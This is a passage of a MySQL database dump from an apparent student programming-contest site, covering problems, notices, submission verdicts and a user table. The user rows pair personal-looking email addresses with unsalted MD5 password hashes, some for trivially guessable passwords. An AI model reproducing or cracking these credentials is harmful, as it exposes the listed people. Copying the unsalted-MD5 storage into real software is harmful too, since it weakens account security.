(1, 'balamoy', 'rasel', 'h1', 'RakibulRanak', 'acs', 'hello\r\n', 'hello\n', 6, 1.00, 2),
(5, 'contest60', 'A', 'efvfev', 'RakibulRanak', 'f3r', '1\r\n', '1\n', 7, 1.00, 1),
(1, 'balamoy', 'hbena', 'hjgvhj', 'RakibulRanak', 'vhm', 'vjg', '', 8, 1.00, 2),
(3, 'swe17', 'Ranak1', 'czv', 'RakibulRanak', 'xz ', 'c', '', 10, 1.00, 2),
(7, 'Final test', 'A', 's', 'RakibulRanak', '1', 'A\r\n', 'A\n', 11, 1.00, 2),
(7, 'Final test', 'B', 's', 'RakibulRanak', '1', 'B\r\n', 'B\n', 12, 1.00, 2),
(7, 'Final test', 'C', 's', 'RakibulRanak', '1', 'C\r\n', 'C\n', 13, 1.00, 2),
(7, 'Final test', 'D', 's', 'RakibulRanak', '1', 'D\r\n', 'D\n', 14, 1.00, 2),
(8, 'penalty', 'A', 'A\r\n<h1> <b>hi </b></h1>\r\n<br>', 'RakibulRanak', 'a', 'A\r\n', 'A\n', 15, 1.00, 2),
(8, 'penalty', 'B', 'Bddac', 'RakibulRanak', 'a', 'B\r\n', '', 16, 1.00, 2),
(8, 'penalty', 'C', 'C', 'RakibulRanak', 'C', 'C\r\n', '', 17, 1.00, 2),
(8, 'penalty', 'D', 'D', 'RakibulRanak', 'C', 'D\r\n', '', 18, 1.00, 2),
(9, 'finally', 'Aa', 'A', 'RakibulRanak', 'A', 'A\r\n', 'A\n', 19, 1.00, 2),
(9, 'finally', 'B', 'B', 'RakibulRanak', 'A', 'B\r\n', 'B\n', 20, 1.00, 2),
(9, 'finally', 'C', 'C', 'RakibulRanak', 'A', 'C\r\n', 'C\n', 21, 1.00, 2),
(9, 'finally', 'D', '<h1> <b> D </b> </h1> <br>', 'RakibulRanak', 'D', 'D\r\n', '', 22, 1.00, 2);

-- --------------------------------------------------------

--
-- Table structure for table `notice`
--

CREATE TABLE `notice` (
  `id` int(100) NOT NULL,
  `des` varchar(500) NOT NULL,
  `exdate` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `notice`
--

INSERT INTO `notice` (`id`, `des`, `exdate`) VALUES
(1, '30/01/2019 ; 10:00 PM Next Contest !!', '2020-01-24'),
(8, 'agageqgeqgeq', '2020-01-28');

-- --------------------------------------------------------

--
-- Table structure for table `solve`
--

CREATE TABLE `solve` (
  `sname` varchar(100) DEFAULT NULL,
  `cid` int(11) DEFAULT NULL,
  `pbname` varchar(100) DEFAULT NULL,
  `solved` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `submission`
--

CREATE TABLE `submission` (
  `sid` int(100) NOT NULL,
  `sname` varchar(100) DEFAULT NULL,
  `verdict` varchar(50) DEFAULT NULL,
  `pbid` int(11) DEFAULT NULL,
  `pbname` varchar(100) DEFAULT NULL,
  `cid` int(11) DEFAULT NULL,
  `status` int(11) DEFAULT NULL,
  `penalty` decimal(10,2) DEFAULT NULL,
  `time` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `submission`
--

INSERT INTO `submission` (`sid`, `sname`, `verdict`, `pbid`, `pbname`, `cid`, `status`, `penalty`, `time`) VALUES
(362, 'Ranak', 'Wrong Answer', NULL, 'a', 112, 0, '-5.00', NULL),
(363, 'Ranak', 'Accepted', NULL, 'b', 112, 1, '193.89', NULL),
(364, '1', 'Accepted', NULL, 'a', 112, 1, '181.89', NULL),
(366, '2', 'Accepted', NULL, 'a', 112, 1, '169.56', NULL),
(367, '2', 'Wrong Answer', NULL, 'b', 112, 0, '-5.00', NULL),
(368, '3', 'Accepted', NULL, 'a', 112, 1, '151.78', NULL),
(371, '1', 'Accepted', NULL, 'b', 112, 1, '161.41', NULL),
(411, '3', 'Accepted', NULL, 'b', 112, 1, '66.67', NULL),
(415, '3', 'Accepted', NULL, 'c', 112, 1, '89.95', NULL),
(417, '3', 'Wrong Answer', NULL, 'b', 112, 0, '-5.00', NULL),
(418, '3', 'Wrong Answer', NULL, 'b', 112, 0, '-5.00', NULL),
(419, '3', 'Wrong Answer', NULL, 'b', 112, 0, '-5.00', NULL),
(431, '1', 'Wrong Answer', NULL, 'aa', 112, 0, '-5.00', NULL),
(432, 'maraz', 'Accepted', NULL, 'Emonbokachoda', 13, 1, '147.33', NULL),
(436, 'maraz', 'Wrong Answer', NULL, 'achudagayok', 13, 0, '-5.00', NULL),
(438, 'maraz', 'Accepted', NULL, 'achudagayok', 13, 1, '102.00', NULL),
(439, 'emonnn', 'Compilation Error', NULL, 'achudagayok', 13, 0, '-5.00', NULL),
(440, 'dipubal', 'Accepted', NULL, 'DJ RUMI', 13, 1, '82.67', NULL),
(443, 'dipubal', 'Accepted', NULL, 'Emonbokachoda', 13, 1, '52.00', NULL),
(444, 'maraz', 'Accepted', NULL, 'DJ RUMI', 13, 1, '41.33', NULL),
(445, 'dipubal', 'Accepted', NULL, 'achudagayok', 13, 1, '24.00', NULL),
(447, 'maraz', 'Accepted', NULL, 'Metal Maraz', 13, 1, '7.33', NULL),
(448, 'dipubal', 'Accepted', NULL, 'Metal Maraz', 13, 1, '57596.67', NULL),
(453, 'dipubal', 'Wrong Answer', NULL, 'Abal', 13, 0, '-5.00', NULL),
(454, '1', 'Wrong Answer', NULL, 'Abal', 13, 0, '-5.00', NULL),
(455, '1', 'Wrong Answer', NULL, 'Abal', 13, 0, '-5.00', NULL),
(456, '1', 'Wrong Answer', NULL, 'Abal', 13, 0, '-5.00', NULL),
(457, 'RakibulRanak', 'Wrong Answer', NULL, 'Abal', 13, 0, '-5.00', NULL),
(458, 'RakibulRanak', 'Accepted', NULL, 'Emonbokachoda', 13, 1, '10.60', NULL),
(459, '1', 'Accepted', NULL, 'Abal', 13, 1, '198.60', NULL),
(461, '2', 'Wrong Answer', NULL, 'Abal', 13, 0, '-5.00', NULL),
(462, '2', 'Wrong Answer', NULL, 'Abal', 13, 0, '-5.00', NULL),
(463, '2', 'Wrong Answer', NULL, 'Abal', 13, 0, '-5.00', NULL),
(464, '2', 'Accepted', NULL, 'Abal', 13, 1, '40.19', NULL),
(465, '3', 'Accepted', NULL, 'Emonbokachoda', 13, 1, '7.98', NULL),
(497, '4', 'Accepted', NULL, 'Abal', 13, 1, '126.74', NULL),
(499, '4', 'Accepted', NULL, 'Metal Maraz', 13, 1, '126.28', NULL),
(500, '4', 'Accepted', NULL, 'Emonbokachoda', 13, 1, '125.74', NULL),
(501, '4', 'Accepted', NULL, 'DJ RUMI', 13, 1, '198.16', NULL),
(502, '4', 'Accepted', NULL, 'achudagayok', 13, 1, '175.22', NULL),
(504, '3', 'Accepted', NULL, 'achudagayok', 13, 1, '93.27', NULL),
(505, '3', 'Time Limit Exceed', NULL, 'DJ RUMI', 13, 0, '-5.00', NULL),
(511, '3', 'Wrong Answer', NULL, '1q', 13, 0, '-5.00', NULL),
(519, '3', 'Wrong Answer', NULL, '1q', 13, 0, '-5.00', NULL),
(520, '3', 'Wrong Answer', NULL, '1q', 13, 0, '-5.00', NULL),
(521, 'maraz', 'Accepted', NULL, 'Kheloar', 101, 1, '188.37', NULL),
(522, 'emonnn', 'Accepted', NULL, 'Kheloar', 101, 1, '184.77', NULL),
(523, 'Souhardya Saha', 'Accepted', NULL, 'Kheloar', 101, 1, '181.00', NULL),
(524, 'emonnn', 'Accepted', NULL, 'AchudaGayok', 101, 1, '180.02', NULL),
(525, 'maraz', 'Accepted', NULL, 'AchudaGayok', 101, 1, '179.52', NULL),
(526, 'emonnn', 'Accepted', NULL, 'CR', 101, 1, '175.92', NULL),
(528, 'emonnn', 'Accepted', NULL, 'Metal', 101, 1, '172.32', NULL),
(530, 'Souhardya Saha', 'Runtime Error', NULL, 'AchudaGayok', 101, 0, '-5.00', NULL),
(531, 'maraz', 'Accepted', NULL, 'CR', 101, 1, '168.88', NULL),
(532, 'emonnn', 'Accepted', NULL, 'RumiHero', 101, 1, '166.91', NULL),
(534, 'emonnn', 'Accepted', NULL, 'SadaCock', 101, 1, '159.21', NULL),
(535, '100', 'Accepted', NULL, 'CR', 101, 1, '154.63', NULL),
(536, 'maraz', 'Accepted', NULL, 'Metal', 101, 1, '154.14', NULL),
(537, 'Souhardya Saha', 'Accepted', NULL, 'AchudaGayok', 101, 1, '152.99', NULL),
(538, '100', 'Accepted', NULL, 'Metal', 101, 1, '148.89', NULL),
(539, 'Souhardya Saha', 'Accepted', NULL, 'CR', 101, 1, '147.58', NULL),
(540, 'Souhardya Saha', 'Accepted', NULL, 'Metal', 101, 1, '142.83', NULL),
(541, 'maraz', 'Wrong Answer', NULL, 'RumiHero', 101, 0, '-5.00', NULL),
(542, '100', 'Accepted', NULL, 'SadaCock', 101, 1, '138.57', NULL),
(543, 'Souhardya Saha', 'Accepted', NULL, 'RumiHero', 101, 1, '138.41', NULL),
(544, '100', 'Accepted', NULL, 'Kheloar', 101, 1, '134.15', NULL),
(545, 'Souhardya Saha', 'Accepted', NULL, 'SadaCock', 101, 1, '133.33', NULL),
(546, 'maraz', 'Wrong Answer', NULL, 'RumiHero', 101, 0, '-5.00', NULL),
(547, '100', 'Accepted', NULL, 'AchudaGayok', 101, 1, '127.93', NULL),
(548, '100', 'Accepted', NULL, 'RumiHero', 101, 1, '124.32', NULL),
(549, 'maraz', 'Accepted', NULL, 'RumiHero', 101, 1, '122.36', NULL),
(550, 'shaswata56', 'Accepted', NULL, 'Kheloar', 101, 1, '115.32', NULL),
(551, 'maraz', 'Accepted', NULL, 'SadaCock', 101, 1, '114.50', NULL),
(552, 'shaswata56', 'Accepted', NULL, 'AchudaGayok', 101, 1, '104.50', NULL),
(554, 'shaswata56', 'Accepted', NULL, 'CR', 101, 1, '86.98', NULL),
(555, 'shaswata56', 'Accepted', NULL, 'Metal', 101, 1, '77.31', NULL),
(556, 'shaswata56', 'Accepted', NULL, 'RumiHero', 101, 1, '66.34', NULL),
(557, 'shaswata56', 'Accepted', NULL, 'SadaCock', 101, 1, '57.17', NULL),
(558, 'RakibulRanak', 'Wrong Answer', NULL, 'Kheloar', 101, 0, '-5.00', '2020-01-21 03:19:49'),
(559, 'RakibulRanak', 'Wrong Answer', NULL, 'Kheloar', 101, 0, '-5.00', '2020-01-21 03:26:22'),
(560, 'RakibulRanak', 'Accepted', NULL, 'Kheloar', 101, 1, '35.52', '2020-01-21 03:27:43'),
(570, 'RakibulRanak', 'Wrong Answer', NULL, 'test100', 12, 0, '-5.00', '2020-01-22 15:29:53'),
(571, 'RakibulRanak', 'Wrong Answer', NULL, 'test100', 12, 0, '-5.00', '2020-01-22 15:31:47'),
(572, 'RakibulRanak', 'Wrong Answer', NULL, 'test100', 12, 0, '-5.00', '2020-01-22 15:33:13'),
(573, 'RakibulRanak', 'Wrong Answer', NULL, 'test100', 12, 0, '-5.00', '2020-01-22 15:37:31'),
(574, 'RakibulRanak', 'Accepted', NULL, 'test100', 12, 1, '5.15', '2020-01-22 15:41:39'),
(576, 'RakibulRanak', 'Accepted', NULL, 'A', 500, 1, '175.08', '2020-01-22 16:13:05'),
(577, 'RakibulRanak', 'Time Limit Exceed', NULL, 'B', 1, 0, '-5.00', '2020-01-24 03:07:20'),
(578, 'RakibulRanak', 'Wrong Answer', NULL, 'B', 1, 0, '-5.00', '2020-01-24 03:08:01'),
(579, 'RakibulRanak', 'Wrong Answer', NULL, 'B', 1, 0, '-5.00', '2020-01-24 03:08:33'),
(580, 'RakibulRanak', 'Accepted', NULL, 'B', 1, 1, '0.02', '2020-01-24 03:10:21'),
(581, 'RakibulRanak', 'Wrong Answer', NULL, 'rasel', 1, 0, '-5.00', '2020-01-24 03:21:07'),
(582, 'RakibulRanak', 'Accepted', NULL, 'rasel', 1, 1, '0.02', '2020-01-24 03:21:54'),
(583, '1', 'Accepted', NULL, 'rasel', 1, 1, '0.01', '2020-01-24 03:23:14'),
(584, '1', 'Accepted', NULL, 'A', 5, 1, '3600.00', '2020-01-24 03:31:33'),
(585, 'RakibulRanak', 'Accepted', NULL, 'A', 5, 1, '3561.54', '2020-01-24 03:32:33'),
(586, '2', 'Accepted', NULL, 'A', 5, 1, '3517.31', '2020-01-24 03:33:42'),
(588, '1', 'Accepted', NULL, 'A', 7, 1, '192.33', '2020-01-25 23:46:15'),
(589, '2', 'Accepted', NULL, 'A', 7, 1, '182.33', '2020-01-25 23:46:45'),
(590, 'RakibulRanak', 'Wrong Answer', NULL, 'D', 7, 0, '-5.00', '2020-01-25 23:47:26'),
(591, 'RakibulRanak', 'Accepted', NULL, 'D', 7, 1, '162.33', '2020-01-25 23:47:45'),
(592, 'RakibulRanak', 'Accepted', NULL, 'C', 7, 1, '144.00', '2020-01-25 23:48:40'),
(595, 'RakibulRanak', 'Accepted', NULL, 'A', 7, 1, '65.02', '2020-01-26 00:28:17'),
(596, 'RakibulRanak', 'Accepted', NULL, 'B', 7, 1, '65.00', '2020-01-26 00:28:43'),
(597, '1', 'Accepted', NULL, 'B', 7, 1, '0.04', '2020-01-26 00:30:30'),
(599, '1', 'Accepted', NULL, 'C', 7, 1, '0.04', '2020-01-26 01:09:37'),
(600, '2', 'Wrong Answer', NULL, 'B', 7, 0, '-5.00', '2020-01-26 01:10:06'),
(601, '2', 'Wrong Answer', NULL, 'B', 7, 0, '0.00', '2020-01-26 01:10:38'),
(602, '2', 'Wrong Answer', NULL, 'B', 7, 0, '0.00', '2020-01-26 01:10:54'),
(603, '2', 'Accepted', NULL, 'B', 7, 1, '30.00', '2020-01-26 01:11:09'),
(606, '2', 'Accepted', NULL, 'C', 7, 1, '88.00', '2020-01-26 01:14:51'),
(608, '2', 'Wrong Answer', NULL, 'D', 7, 0, '0.00', '2020-01-26 01:16:44'),
(610, '2', 'Wrong Answer', NULL, 'D', 7, 0, '0.00', '2020-01-26 01:17:34'),
(611, '2', 'Wrong Answer', NULL, 'D', 7, 0, '0.00', '2020-01-26 01:17:41'),
(612, '2', 'Accepted', NULL, 'D', 7, 1, '122.00', '2020-01-26 01:17:52'),
(614, '3', 'Accepted', NULL, 'A', 7, 1, '112.00', '2020-01-26 01:38:18'),
(615, '3', 'Wrong Answer', NULL, 'B', 7, 0, '0.00', '2020-01-26 01:38:57'),
(616, '3', 'Accepted', NULL, 'B', 7, 1, '123.00', '2020-01-26 01:39:07'),
(617, 'RakibulRanak', 'Accepted', NULL, 'A', 8, 1, '0.00', '2020-01-26 01:41:35'),
(618, '1', 'Accepted', NULL, 'A', 8, 1, '1.00', '2020-01-26 01:42:02'),
(619, '1', 'Accepted', NULL, 'B', 8, 1, '1.00', '2020-01-26 01:42:29'),
(620, '1', 'Wrong Answer', NULL, 'C', 8, 0, '0.00', '2020-01-26 01:42:46'),
(621, '1', 'Accepted', NULL, 'C', 8, 1, '12.00', '2020-01-26 01:42:55'),
(623, 'RakibulRanak', 'Compilation Error', 16, 'B', 8, 0, '0.00', '2020-01-28 01:23:18'),
(624, '1', 'Accepted', 19, 'A', 9, 1, '0.00', '2020-01-28 01:40:38'),
(625, '1', 'Wrong Answer', 20, 'B', 9, 0, '0.00', '2020-01-28 01:41:32'),
(626, '1', 'Wrong Answer', 20, 'B', 9, 0, '0.00', '2020-01-28 01:42:12'),
(627, '1', 'Accepted', 20, 'B', 9, 1, '22.00', '2020-01-28 01:42:36'),
(628, 'RakibulRanak', 'Accepted', 19, 'Aa', 9, 1, '2.00', '2020-01-28 01:43:17'),
(629, 'RakibulRanak', 'Accepted', 20, 'B', 9, 1, '3.00', '2020-01-28 01:43:48'),
(630, 'RakibulRanak', 'Accepted', 21, 'C', 9, 1, '4.00', '2020-01-28 01:44:32'),
(631, '2', 'Accepted', 22, 'D', 9, 1, '4.00', '2020-01-28 01:45:17'),
(632, '2', 'Accepted', 20, 'B', 9, 1, '5.00', '2020-01-28 01:45:51'),
(633, '3', 'Accepted', 19, 'Aa', 9, 1, '6.00', '2020-01-28 01:46:57'),
(634, 'RakibulRanak', 'Compilation Error', 22, 'D', 9, 0, '0.00', '2020-01-28 01:47:31');

-- --------------------------------------------------------

--
-- Table structure for table `submissions`
--

CREATE TABLE `submissions` (
  `sid` int(11) NOT NULL,
  `sname` varchar(50) DEFAULT NULL,
  `verdict` varchar(50) DEFAULT NULL,
  `pbname` varchar(500) DEFAULT NULL,
  `time` float(10,2) DEFAULT 0.00,
  `time2` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `submissions`
--

INSERT INTO `submissions` (`sid`, `sname`, `verdict`, `pbname`, `time`, `time2`) VALUES
(323, 'RakibulRanak', 'Accepted', 'Trick', 0.00, NULL),
(324, 'RakibulRanak', 'Accepted', 'Trick', 0.00, NULL),
(325, 'RakibulRanak', 'Accepted', 'Trick', 0.00, NULL),
(326, 'RakibulRanak', 'Accepted', 'Trick', 0.00, NULL),
(327, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(328, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(329, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(330, 'RakibulRanak', 'Wrong Answer', 'IP Checking', 0.00, NULL),
(331, 'RakibulRanak', 'Wrong Answer', 'IP Checking', 0.00, NULL),
(332, 'RakibulRanak', 'Wrong Answer', 'IP Checking', 0.00, NULL),
(333, 'RakibulRanak', 'Wrong Answer', 'IP Checking', 0.00, NULL),
(334, 'RakibulRanak', 'Wrong Answer', 'IP Checking', 0.00, NULL),
(335, 'RakibulRanak', 'Wrong Answer', 'IP Checking', 0.00, NULL),
(336, 'RakibulRanak', 'Wrong Answer', 'IP Checking', 0.00, NULL),
(337, 'RakibulRanak', 'Wrong Answer', 'IP Checking', 0.00, NULL),
(338, 'RakibulRanak', 'Wrong Answer', 'IP Checking', 0.00, NULL),
(339, 'RakibulRanak', 'Wrong Answer', 'IP Checking', 0.00, NULL),
(340, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(341, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(342, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(343, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(344, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(345, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(346, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(348, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(349, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(356, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(359, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(360, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(361, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(362, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(363, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(364, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(365, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(366, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(367, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(368, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(369, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(370, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(371, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(372, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(374, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(375, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(376, 'RakibulRanak', 'Compilation Error', 'Trick', 0.00, NULL),
(377, 'RakibulRanak', 'Compilation Error', 'Trick', 0.00, NULL),
(378, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.02, NULL),
(379, 'emonnn', 'Wrong Answer', 'Vxd Foga', 0.00, NULL),
(380, 'emonnn', 'Wrong Answer', 'Vxd Foga', 0.00, NULL),
(381, 'emonnn', 'Accepted', 'Vxd Foga', 0.00, NULL),
(382, 'RakibulRanak', 'Wrong Answer', 'Vxd Foga', 0.00, NULL),
(383, 'emonnn', 'Wrong Answer', 'Vxd Foga', 0.00, NULL),
(384, 'emonnn', 'Wrong Answer', 'Vxd Foga', 0.01, NULL),
(385, 'emonnn', 'Accepted', 'Vxd Foga', 0.00, NULL),
(386, 'RakibulRanak', 'Wrong Answer', 'bala', 0.00, NULL),
(388, 'RakibulRanak', 'Accepted', 'bala', 0.00, NULL),
(389, 'RakibulRanak', 'Wrong Answer', 'bala', 0.02, NULL),
(390, 'RakibulRanak', 'Wrong Answer', 'bala', 0.01, NULL),
(391, 'RakibulRanak', 'Wrong Answer', 'bala', 0.00, NULL),
(392, 'RakibulRanak', 'Wrong Answer', 'bala', 0.00, NULL),
(393, 'RakibulRanak', 'Wrong Answer', 'bala', 0.00, NULL),
(394, 'RakibulRanak', 'Wrong Answer', 'Trick', 0.00, NULL),
(395, 'RakibulRanak', 'Accepted', 'Trick', 0.00, NULL),
(396, 'Maraz Mia', 'Wrong Answer', 'Trick', 0.00, NULL),
(397, 'Maraz Mia', 'Accepted', 'Trick', 0.00, NULL),
(399, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.01, NULL),
(400, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(401, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(402, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(403, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(404, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(406, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(407, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(408, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.01, NULL),
(409, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(410, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(411, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(412, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(413, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(414, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(421, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(422, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(423, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(424, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(425, 'RakibulRanak', 'Compilation Error', 'Trick41', 0.00, NULL),
(426, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.00, NULL),
(511, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(516, 'RakibulRanak', 'Compilation Error', 'Trick41', 0.00, NULL),
(517, 'RakibulRanak', 'Compilation Error', 'Trick41', 0.00, NULL),
(519, 'RakibulRanak', 'Compilation Error', 'Trick41', 0.00, NULL),
(520, 'RakibulRanak', 'Compilation Error', 'Trick41', 0.00, NULL),
(535, 'RakibulRanak', 'Wrong Answer', 'Google feeling lucky.', 0.01, NULL),
(536, 'RakibulRanak', 'Wrong Answer', 'Abal', 0.01, NULL),
(537, 'RakibulRanak', 'Wrong Answer', 'Abal', 0.01, NULL),
(538, 'RakibulRanak', 'Accepted', 'Abal', 0.01, NULL),
(598, '1', 'Compilation Error', 'Trick41', 0.00, NULL),
(599, 'RakibulRanak', 'Compilation Error', 'Trick41', 0.00, NULL),
(632, '3', 'Compilation Error', 'Trick41', 0.00, NULL),
(633, '3', 'Accepted', 'Abal', 0.00, NULL),
(635, '3', 'Time Limit Exceed', 'Abal', 4.00, NULL),
(636, '3', 'Wrong Answer', 'Abal', 0.11, NULL),
(642, 'shaswata56', 'Compilation Error', 'Trick41', 0.00, NULL),
(643, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, NULL),
(644, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.01, '2020-01-21 03:37:11'),
(645, 'RakibulRanak', 'Accepted', 'Trick41', 0.00, '2020-01-21 03:40:58'),
(646, 'RakibulRanak', 'Accepted', 'Trick41', 0.06, '2020-01-21 15:51:10'),
(649, 'RakibulRanak', 'Compilation Error', 'Google feeling lucky.', 0.00, '2020-01-22 02:43:19'),
(650, 'RakibulRanak', 'Accepted', 'Trick41', 0.01, '2020-01-22 15:39:06'),
(651, 'RakibulRanak', 'Accepted', 'Trick41', 0.01, '2020-01-22 15:39:21'),
(652, 'RakibulRanak', 'Accepted', 'Trick41', 0.01, '2020-01-22 15:40:16'),
(653, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.00, '2020-01-22 18:53:29'),
(654, 'RakibulRanak', 'Wrong Answer', 'Trick41', 0.01, '2020-01-22 18:54:13'),
(655, '1', 'Accepted', 'A', 0.01, '2020-01-22 19:16:08'),
(656, '1', 'Wrong Answer', 'A', 0.00, '2020-01-22 19:16:21'),
(658, 'RakibulRanak', 'Accepted', 'Collecting Coins', 0.00, '2020-01-24 14:28:37'),
(659, 'RakibulRanak', 'Time Limit Exceed', 'Trick41', 4.00, '2020-01-24 19:53:46'),
(660, 'RakibulRanak', 'Wrong Answer', 'Collecting Coins', 0.00, '2020-01-28 00:17:11'),
(661, 'RakibulRanak', 'Compilation Error', 'Collecting Coins', 0.00, '2020-01-28 00:18:19'),
(662, 'RakibulRanak', 'Compilation Error', 'Collecting Coins', 0.00, '2020-01-28 00:22:30'),
(663, 'RakibulRanak', 'Compilation Error', 'Collecting Coins', 0.00, '2020-01-28 00:22:51'),
(665, 'RakibulRanak', 'Compilation Error', 'Collecting Coins', 0.00, '2020-01-28 00:27:12'),
(666, 'RakibulRanak', 'Compilation Error', 'Collecting Coins', 0.00, '2020-01-28 00:27:33'),
(667, 'RakibulRanak', 'Wrong Answer', 'Collecting Coins', 0.00, '2020-01-28 00:37:18');

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE `user` (
  `name` varchar(40) NOT NULL DEFAULT '',
  `pass` varchar(40) DEFAULT NULL,
  `status` varchar(50) DEFAULT 'student',
  `email` varchar(100) NOT NULL DEFAULT '',
  `photo` longblob DEFAULT NULL,
  `Verified` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`name`, `pass`, `status`, `email`, `photo`, `Verified`) VALUES
('', '202cb962ac59075b964b07152d234b70', 'Developer', 'rakibulhasanranak123123@gmail.com', 0x4453435f303635392e4a5047, 0),
('1', 'c4ca4238a0b923820dcc509a6f75849b', 'user', '12@gmail.com', 0x53637265656e73686f742066726f6d20323031392d30392d31312030322d31352d30322e706e67, 0),
('100', 'f899139df5e1059396431415e770c6dd', 'user', 'yoyo@yoyo.com', 0x7269636b2d616e642d6d6f7274792d68656973742d676c61737365732e6a706567, 0),
('2', 'c81e728d9d4c2f636f067f89cc14862c', 'user', '2@gmail.com', NULL, 0),
('3', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', 'user', '3@gmail.com', NULL, 0),
('4', 'a87ff679a2f3e71d9181a67b7542122c', 'user', '4@gmail.com', NULL, 0),
('abala', '9215d2e245c38d12ac26f46559b1ebe1', 'user', 'abala@gmail.com', NULL, 0),
('admin', '21232f297a57a5a743894a0e4a801fc3', 'user', 'admin@gmail.com', 0x53637265656e73686f742066726f6d20323031392d31302d31302031362d30312d30322e706e67, 0),
('bala', '81dc9bdb52d04dc20036dbd8313ed055', 'Teacher', 'dipubala466@gmail.com', 0x37383637323432325f323537393330393335353435313236305f343430383139383339363435323533363332305f6e2e6a7067, 0),
('bla', 'df5ea29924d39c3be8785734f13169c6', 'user', 'blabla@gmail.com', '', 0),
('Dipu Bala', '2c216b1ba5e33a27eb6d3df7de7f8c36', 'user', 'dipubala466@gmail.com', '', 0),
('dipubal', '81dc9bdb52d04dc20036dbd8313ed055', 'user', 'dipankar47@student.sust.edu', NULL, 0),
('emonnn', '594f803b380a41396ed63dca39503542', 'user', 'emon.swe.sust@gmail.com', 0x53637265656e73686f742028313037292e706e67, 0),
('hfcgjch', '89243631b6a69884c9d11f923f5d1517', 'user', 'rakibul@gmail.com', '', 0),
('maraz', '81dc9bdb52d04dc20036dbd8313ed055', 'user', 'maraj262000@gmail.com', NULL, 0),
('Maraz Mia', '827ccb0eea8a706c4c34a16891f84e7b', 'user', 'maraj262000@gmail.com', 0x746573742e6a7067, 0),
('Pulock', 'f3c4571f3fe5108b1176c6ee6eb09908', 'user', 'pulockkamol50@gmail.com', '', 0),
('RakibulRa', 'bb4aba0633e187d42afb56ac43d605af', 'user', 'khairgyuykh@vvh', '', 0),
('RakibulRanak', '202cb962ac59075b964b07152d234b70', 'Developer', 'rakibulhasanranak210@gmail.com', 0x38323339313835345f3132343039343938393038323834355f383231383635353034303239303638343932385f6e2e6a7067, 0),
('RakibulRanak05', 'bb4aba0633e187d42afb56ac43d605af', 'user', 'rakaaaibul2@gmail.com', NULL, 0),
